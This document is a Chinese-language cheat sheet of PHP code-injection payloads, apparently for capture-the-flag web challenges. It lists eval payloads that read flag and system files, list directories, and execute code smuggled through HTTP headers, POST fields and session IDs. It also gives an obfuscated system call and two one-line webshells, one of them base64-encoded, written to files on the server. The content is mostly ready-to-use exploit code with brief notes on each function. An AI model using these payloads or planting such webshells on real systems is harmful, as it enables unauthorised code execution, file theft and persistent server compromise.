**用eval执行PHP代码**

## 读取文件

```
c=show_source(next(array_reverse(scandir(pos(localeconv())))));

c=show_source(array_reverse(scandir(pos(localeconv())))[1]);

c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));

c=highlight_file(array_reverse(scandir(pos(localeconv())))[1]);

c=echo file_get_contents("flag.php"); 

c=highlight_file('/flag.txt');

c=readfile("flag.php"); 

c=var_dump(file('flag.php')); 

c=print_r(file('flag.php'));

copy('flag.php','flag.txt');

c=include('/flag.txt'); 

c=require('/flag.txt');

c=require_once('/flag.txt');

?c=readgzfile('/flag.txt');

通过fopen去读取文件内容，这里介绍下函数
fread()
fgets()
fgetc()
fgetss()
fgetcsv()
gpassthru()
readgzfile()

payload:
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."

pos():输出数组第一个元素，不改变指针，pos()函数是current()函数的别名

scandir();遍历目录，这里因为参数为"."所以遍历当前目录,有glob()、readdir(opendir())相似

array_reverse():元组倒置

next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以

show_source():查看源码

current()返回数组中的当前元素的值。

end()将内部指针指向数组中的最后一个元素，并输出。

prev()将内部指针指向数组中的上一个元素，并输出。

reset()将内部指针指向数组中的第一个元素，并输出。

each()返回当前元素的键名和键值，并将内部指针向前移动

get_defined_vars()以数组的形式返回所有定义的变量：
```

## 读取目录

```php
c=print_r(scandir(dirname('__FILE__')));
获取当前脚本文件所在目录（使用 dirname(__FILE__)），然后使用 scandir() 函数列出该目录中的文件和子目录，并使用 print_r() 函数将结果以可读的形式输出到浏览器或命令行。这将显示目录中的文件和子目录列表

c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
使用 DirectoryIterator 类来遍历系统根目录（glob:///* 表示系统根目录），并将每个目录项的名称打印到浏览器或命令行

c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };
使用 opendir() 打开当前目录（./ 表示当前目录），然后使用 readdir() 函数来遍历当前目录中的文件和子目录，并将它们的名称以换行符分隔的方式打印到浏览器或命令行。

c=print_r(scandir('./'));

c=var_dump(scandir('/'));

c=var_export(scandir('/'));

c=print_r(glob(getcwd()));

c=var_dump(scandir(dirname(getcwd())));

c=echo(implode('---',scandir("/")));

使用 scandir() 函数列出根目录中的文件和子目录，然后使用 implode() 函数将它们连接成一个字符串，使用 '---' 作为分隔符，最后使用 echo 打印这个字符串


getcwd() //获取当前目录
```

## 利用文件头

```
eval(next(getallheaders()));//执行文件头

eval(end(getallheaders()));

echo(next(getallheaders()));//回显文件头

var_dump(getallheaders());

system(current(getallheaders()));

getallheaders()返回文件头，即获取http所有的头部信息，也就是headers
```

## 利用表单

```
get_defined_vars();

current(get_defined_vars());

var_dump(end(current(get_defined_vars()));

eval(end(current(get_defined_vars()));

get_defined_vars()获取的四个全局变量$_GET $_POST $_FILES $_COOKIE，而它的返回值是一个二维数组

eval(get_defined_vars()[_POST][a]);
a=phpinfo();

eval(pos(pos(get_defined_vars())));
1=passthru(‘cat /f*’)
```

## 利用Session

```
需要先session_start()才能session_id()

echo(session_id());

echo(session_id(session_start()));

eval(hex2bin(session_id(session_start()))); //PHP 中session为16进制，所以传session时也需十六进制编码
```

## 写一句话木马

```
fputs(fopen('dotast.php','w'),base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==\"));

_=file_put_contents("1.php","<?php eval(\$_POST[1]);?>");
当传一句话木马时，需注意在$前加上斜杠，加一个\代表转义
```

## 数学函数

```
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&pi=system&abs=cat /flag
```

## 一些好玩的可利用的函数

```
getenv() //获取一个环境变量的值，没有参数时，会返回数组

array_rand() //从数组中随机取出一个或多个单元

array_flip() //交换数组中的键与值，值变成键，键变成值

dirname(getcwd())

chdir(dirname(getcwd()))

readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));

/[^\s\(\)]+?\((?R)?\)/ //无参执行的正则表达式
```

参考博客：

[RCE篇之无参数rce | Arsene.Tang (arsenetang.com)](http://arsenetang.com/2021/07/26/RCE篇之无参数rce/#1-getallheaders)

[PHP Parametric Function RCE · sky's blog (skysec.top)](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)
